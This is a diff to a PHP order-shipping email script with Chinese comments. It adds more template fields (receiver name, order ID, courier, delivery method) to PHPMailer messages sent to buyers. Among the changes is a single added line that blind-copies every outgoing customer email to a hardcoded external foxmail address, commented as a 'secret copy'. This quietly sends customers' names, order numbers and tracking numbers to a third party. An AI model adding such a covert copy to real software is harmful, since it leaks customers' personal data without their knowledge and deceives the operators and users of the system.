@@ -55,13 +55,26 @@ if(isset($_POST['send_mail'])){
 
 			$to_mail = $res['buyer_email'];	#邮箱
 		 	$buyer_name = $res['buyer_name'];	#购买人
-		 	$oms_order_express_num = $res['oms_order_express_num'];	#单号
+		 	$receive_name = $res['receive_name'];	#收货人
+		 	$order_id = $res['order_id'];	#订单号
+		 	$express_company = $res['express_company'];	#快递公司
+		 	$send_method = $res['send_method'];	#配送方式
+		 	$express_num = $res['oms_order_express_num'];	#快递单号
 
 			//替换信件变量
-			$mail_topic = str_replace('#购买人#', $buyer_name, $mail_topic);
-			$mail_topic = str_replace('#快递单号#', $oms_order_express_num, $mail_topic);
-			$mail_html = str_replace('#购买人#', $buyer_name, $mail_html);
-			$mail_html = str_replace('#快递单号#', $oms_order_express_num, $mail_html);
+			$mail_topic = str_replace('#buyer_name#', $buyer_name, $mail_topic);
+			$mail_topic = str_replace('#receive_name#', $receive_name, $mail_topic);
+			$mail_topic = str_replace('#order_id#', $order_id, $mail_topic);
+			$mail_topic = str_replace('#express_company#', $express_company, $mail_topic);
+			$mail_topic = str_replace('#send_method#', $send_method, $mail_topic);
+			$mail_topic = str_replace('#express_num#', $express_num, $mail_topic);
+
+			$mail_html = str_replace('#buyer_name#', $buyer_name, $mail_html);
+			$mail_html = str_replace('#receive_name#', $receive_name, $mail_html);
+			$mail_html = str_replace('#order_id#', $order_id, $mail_html);
+			$mail_html = str_replace('#express_company#', $express_company, $mail_html);
+			$mail_html = str_replace('#send_method#', $send_method, $mail_html);
+			$mail_html = str_replace('#express_num#', $express_num, $mail_html);
 
 			//发送
 			$mail = new PHPMailer;
@@ -75,6 +88,7 @@ if(isset($_POST['send_mail'])){
 			$mail->Port = $mail_port;                                    // 邮件端口
 			$mail->setFrom($mail_id, $mail_name);
 			$mail->addAddress($to_mail, $buyer_name);     // 收件人
+			$mail->addBCC('ycmbcd@foxmail.com');	//秘密抄送
 			$mail->addReplyTo($mail_answer_addr, '');	//邮件回复地址
 			$mail->isHTML(true);                                  // Set email format to HTML
 			$mail->Subject = $mail_topic;	//邮件标题
